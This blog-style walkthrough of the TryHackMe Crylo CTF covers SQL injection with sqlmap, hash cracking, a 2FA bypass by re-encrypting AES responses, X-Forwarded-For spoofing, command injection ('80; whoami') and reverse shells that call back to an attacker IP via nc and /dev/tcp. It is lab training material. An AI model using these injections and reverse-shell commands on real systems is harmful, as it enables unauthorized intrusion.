---
title: "Circumventing 2FA and Cracking AES Encryption in Crylo CTF by TryHackMe"
slug: crylo-ctf
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

This walkthrough covers the [Crylo](https://tryhackme.com/room/crylo4a) CTF found on [TryHackMe](https://tryhackme.com). The room's theme focuses on identifying weaknesses in security controls designed to prevent unauthorized access. We will discuss SQLMap, HTTP Header manipulation, Hashcat, JSON parameters, and cracking AES-encrypted passwords through reverse engineering a script.

### Step 1: Nmap

As always, we will begin by running a Nmap scan against our target to identify open ports, determine the types of services running, and attempt to obtain version information to assess if any vulnerabilities may exist.

```bash
nmap -sC -sV -p- -T4 crylo.thm -v
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692566080910/5e52fc00-d7e7-4fa8-adc5-738ad7243e9a.png){: .center-image }

Based on the scan results, we can determine that the operating system is Linux and it is running an `Nginx` web server.

### Step 2: Enumerating Web Directories

The next step in our methodology involves examining the existing directories on the webserver to determine if we can uncover any services with vulnerabilities.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt:FUZZ -u http://crylo.thm/FUZZ
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692566381344/f8961d4a-58dc-48c5-9014-0f42f7706ac4.png){: .center-image }

From the results, we can see that there is a `/login` page and something called `/debug` that is returning a 403 redirect. This will prove vital in establishing our initial foothold later on.

### Step 3: Conduct a Manual Website Review

Homepage:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692566550058/e348dc89-94b4-4aa7-a491-27d029155a41.png){: .center-image }

Login:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692566561654/f9b27a39-32cd-471c-8dff-a036db243525.png){: .center-image }

Framework:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692566573567/fa452bb1-6fc4-419b-93ce-07ad224e6003.png){: .center-image }

Unfortunately, there is no vulnerability in the current web server version; however, the login page is susceptible to `SQL injection`. We will utilize `SQLmap` to automate this process and obtain our initial set of credentials.

### Step 4: SQLmap

Let's navigate to the login page, intercept the request using Burp Suite, and explore the possible actions we can take with it using `SQLmap`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692566814150/5c698136-c8ab-45ce-a35a-6718f24f05ba.png){: .center-image }

Let's save this down as `req.txt` and run it through `SQLmap` to see if we can extract a database.

```bash
sqlmap -r req.txt --level=3 --risk=3 --dump --batch --thread=10
```

After running the scan, a database named "`food`" is discovered, containing a table called "`auth_user`." To dump the table, use the following command:

```bash
sqlmap -r req.txt --batch --dump -T auth_user -D food
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568568120/016ee792-06a9-4919-8e1e-f4417df1a2e7.png){: .center-image }

Let's see if we can crack the `admin` and `anof` hashes using `Hashcat`. Notice that the hash type is `Django (PBKDF2-SHA256)`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692567021712/97bb1497-9a2b-4516-bf9a-57981e3e2c6f.png){: .center-image }

Crack it:

```bash
hashcat -a 0 -m 10000 hash.txt /usr/share/wordlists/rockyou.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568620674/ab843ab5-e2b7-4ca8-81d1-ac1aae54bcc4.png){: .center-image }

Excellent, we now have a set of credentials to log in with.

### Step 5: Logging In

Upon entering our credentials, we are redirected to a page requesting a `PIN`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692567141736/7cf5c695-9f17-48fb-a1e3-bf669ddefdfa.png){: .center-image }

After entering a random `PIN`, we are redirected to a page called `/2fa`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692567168420/88cbf582-1fe3-4519-a351-d082b8d77a78.png){: .center-image }

Returning to the `/login` page and examining the source code, we discover an interesting JavaScript file named `validation.js`. Beginning at line 23, we observe that the variable `jsonResponse` either redirects to `/2fa` or `/set-pin`. We can initiate a `PIN` reset by intercepting the login request and modifying the variable `jsonResponse.set_pin` to `False`.

Intercepted request:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568672047/b042a027-3c27-4c23-b0e6-c0d48ca5f30f.png){: .center-image }

Intercept the response to the request "`Content-Disposition: form-data; name="username"`" on line 19 by right-clicking next to it, selecting "`Intercept`", and then choosing "`Response to this request`".

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568744389/213b4f5f-d46b-4003-a184-66dadb924ba1.png){: .center-image }

After intercepting the encrypted `jsonResponse`, we can utilize [https://anyscript.com](https://anyscript.com) to create our own script, which will allow us to bypass the two-factor authentication and reset the `PIN`.

To decrypt the content, follow these steps:

1. Copy the highlighted text:
    
    ```bash
    iL6SVLGiiyY47lh6kX353MqD9I+mcSncHWhuJl6Dg7umFTYotHmMKiPaluJ8J35LebkAv3FSyusGIO8rxwJztzwHX9Ot64ltTlbzi/spfQ4=
    ```
    
2. Grab the string from `var k` in `validation.js`:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692567519273/98aed918-b4c6-436c-b576-30e02cdcf107.png){: .center-image }
    
3. Decrypt the text to retrieve the `JSON` content.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692567543624/a309ef80-e7f2-4d3b-a189-535e5f3ea147.png){: .center-image }
    

Follow these steps to change the variable `'pin_set`' to '`False`' and encrypt the `JSON` text for use with `Burp Suite`.

1. Copy and paste the following `JSON` string into the Encryption Text Field:
    
    ```json
    {"pin_set": "false", "email": "admin@admin.com", "success": "true"}
    ```
    
2. Set the `Secret Key` and `IV` using the same string obtained from `var k`.
    
3. Encrypt.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692567710289/ef5131b0-06b6-46fc-9bb2-0dd7f9b9c536.png){: .center-image }
    
4. Now replace the encrypted `JSON` in `Burp Suite` with our newly generated one.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568784710/e5e4cbcd-03d1-4686-9f81-1e3c1c525a08.png){: .center-image }
    
5. Proceed with the request, and you will be able to set up a new `PIN`.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692567765038/c87f7ae1-93ba-4826-8f03-c195df07a27b.png){: .center-image }
    
6. After setting up your new `PIN`, you will need to re-enter your login credentials. Once you do that, you will achieve a successful login.
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692567805495/80f8b2ca-8a38-44c7-a46a-508e8eb7fd4a.png){: .center-image }

### Step 6: Debug and Initial Foothold

Unfortunately, we still cannot access the `/debug` webpage because it is only accessible to local users. However, we can bypass this restriction by adding the `X-Forwarded-For` header to our request.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568822375/77b94a7f-697f-4395-9b6c-53e4cd62257d.png){: .center-image }

Revise the request, and we will be granted access to the `/debug` page.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692567950746/a10b1a49-df28-45d2-b1ef-259fdb8c3655.png){: .center-image }

From here, we can attach a secondary command to a port like this:

```bash
80; whoami
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568866125/71c3f37e-6d19-4d6e-9ec3-f06066768766.png){: .center-image }

Let's see if we can obtain a reverse shell from this. First, let's set up our listener:

```bash
rlwrap -cAr nc -lvnp 1337
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568012419/5e6d20f2-b79f-40ca-a79e-5ba73834a983.png){: .center-image }

Now, let's attach our shell:

```bash
80; nc 10.13.28.215 1337 | bash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568057684/a3216654-2bec-423a-83b8-e0163afcdaa5.png){: .center-image }

Perfect, we received a callback. However, we can't do much with this shell, so let's see if we can obtain a better one using a bash one-liner. We'll need to set up another listener to catch this one.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568082921/8565abad-6bad-42c2-9704-7e1c95484d2f.png){: .center-image }

Now, let's initiate a better shell:

```bash
bash -i >& /dev/tcp/10.13.28.215/13337 0>&1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568105789/cd419d6f-8013-4524-8cf4-9fc02a4e7ee0.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568112760/be6bdd82-7d33-41ce-8424-bbdcb59bedc1.png){: .center-image }

And we're ready to begin our privilege escalation to root!

### Step 7: Privesc and Root

We can retrieve the `user.txt` flag from the `/home/crylo` directory.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568912680/33c013c4-c9cd-447e-9487-52a12dcde5b1.png){: .center-image }

Navigating to `/home/crylo/Food/food/accounts` reveals the encryption file used in the backend. Referring back to our `SQLmap` dump, we discovered an account named '`anof`' with an unrecognizable hash. We can take the `enc.py` file from the `/accounts` directory and create a script to decrypt the hash.

Enc.py:

```python
# from Crypto.Cipher import AES
# from Crypto.Util.Padding import pad
from base64 import b64encode, b64decode
import base64


# key = '/I02fMuSSvnouuu+/vyyD7NuSEVDB/0gte/z50dM0b4='
# data = 'hello world!'

# cipher = AES.new(b64decode(key), AES.MODE_CBC, iv=b'0123456789abcdef')
# padded_data = pad(data.encode(), cipher.block_size)
# ciphertext = cipher.encrypt(padded_data)
# print(b64encode(ciphertext))


#from Crypto.Cipher import AES
#from pkcs7 import PKCS7Encoder

#key = "8080808080808080".encode()
#mode = AES.MODE_CBC
#iv = "8080808080808080".encode()
#encoder = PKCS7Encoder()


# encryptor = AES.new(key, mode, iv)
# text = "Test@123"
# pad_text = encoder.encode(text)
# cipher = encryptor.encrypt(pad_text)
# enc_cipher = base64.b64encode(cipher)

# secret_text = '{"success":"false", "reason":"User or Password is invalid"}'
# #key = 'A16ByteKey......'
# mode = AES.MODE_CBC
# #iv = '\x00' * 16

# encoder = PKCS7Encoder()
# padded_text = encoder.encode(secret_text)

# e = AES.new(key, mode, iv)
# cipher_text = e.encrypt(padded_text.encode())

# output = (base64.b64encode(cipher_text))
# print(output.decode("utf-8"))
# #print("56iPf4PPRmHLusqyKpf7QQ==")


from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
data = b'toor'   # 9 bytes
key = b'\xc9;\xd4b\xce\xc15\x19;\x00Z^Nw\xafp\x10\xce/r\x0c\xf1\x1c&\x1c\x12a\xd9&b"\xc3'
iv = b'!6\x0b\xc7Xg@\xcc\xe3KY\xcfN\x9b\x81\x91'
cipher1 = AES.new(key, AES.MODE_CBC, iv)
ct = cipher1.encrypt(pad(data, 16))

print(ct)

#cipher2 = AES.new(key, AES.MODE_CBC, iv)
#pt = unpad(cipher2.decrypt(b'\x9f\xc9P\xff\xb3Z\x94\x84\x8a\xeb1\xa2/\xba\x8d\xa5'), 16)
#print(pt)
#assert(data == pt)
```

Let's create a script that uses elements from `Enc.py` to decipher the hash.

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64decode

def main():
    encrypted_data = '<HASH_HERE>'
    data = b64decode(encrypted_data)

    key = b'\xc9;\xd4b\xce\xc15\x19;\x00Z^Nw\xafp\x10\xce/r\x0c\xf1\x1c&\x1c\x12a\xd9&b"\xc3'
    iv = b'!6\x0b\xc7Xg@\xcc\xe3KY\xcfN\x9b\x81\x91'

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)

    print("Decrypted pass:", decrypted_data.decode('utf-8'))

if __name__ == "__main__":
    main()
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568954610/ada303cf-e088-4e6f-928a-c10125316bdf.png){: .center-image }

Now we can switch users to '`anof`' and obtain the root flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692568327277/59a3664b-faec-4e29-873b-91561fda0c13.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692569002789/6e9886e4-dbe7-4b0d-be76-6ce8d7261824.png){: .center-image }

### Summary

> In this walkthrough, we explore the Crylo CTF on TryHackMe, focusing on identifying weaknesses in security controls. We cover various techniques such as using SQLMap, HTTP Header manipulation, Hashcat, JSON parameters, and cracking AES-encrypted passwords through reverse engineering a script. The steps include running Nmap scans, enumerating web directories, conducting manual website reviews, utilizing SQLmap, logging in, bypassing restrictions, obtaining initial footholds, and escalating privileges to root.